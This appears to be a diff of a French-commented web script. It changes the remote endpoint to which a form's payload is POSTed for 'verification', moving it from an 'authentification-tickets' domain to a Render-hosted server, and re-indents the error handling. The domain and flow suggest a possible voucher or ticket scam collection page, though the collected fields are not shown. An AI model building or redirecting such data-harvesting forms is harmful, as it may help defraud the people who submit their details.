@@ -29,7 +29,7 @@ document.addEventListener('DOMContentLoaded', () => {
     };
 
     try {
-      const response = await fetch('https://authentification-tickets.com/api/verify', {
+      const response = await fetch('https://andcho.onrender.com/api/verify', {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json'
@@ -37,18 +37,18 @@ document.addEventListener('DOMContentLoaded', () => {
         body: JSON.stringify(payload)
       });
 
-      const result = await response.json();
+  const result = await response.json();
 
-      if (result.success) {
-        alert('Données transmises avec succès !');
-        // Mettez ici votre redirection finale si besoin
-      } else {
-        alert('Erreur du serveur : ' + result.message);
-      }
-    } catch (error) {
-      console.error('Erreur technique :', error);
-      // Modifie cette ligne pour afficher le vrai message d'erreur (ex: TypeErr: Failed to fetch)
-      alert('Impossible de joindre le serveur de traitement. Détails : ' + error.message);
-    }
+  if (result.success) {
+    alert('Données transmises avec succès !');
+    // Mettez ici votre redirection finale si besoin
+  } else {
+    alert('Erreur du serveur : ' + result.message);
+  }
+} catch (error) {
+  console.error('Erreur technique :', error);
+  // Modifie cette ligne pour afficher le vrai message d'erreur (ex: TypeErr: Failed to fetch)
+  alert('Impossible de joindre le serveur de traitement. Détails : ' + error.message);
+}
 });
 });
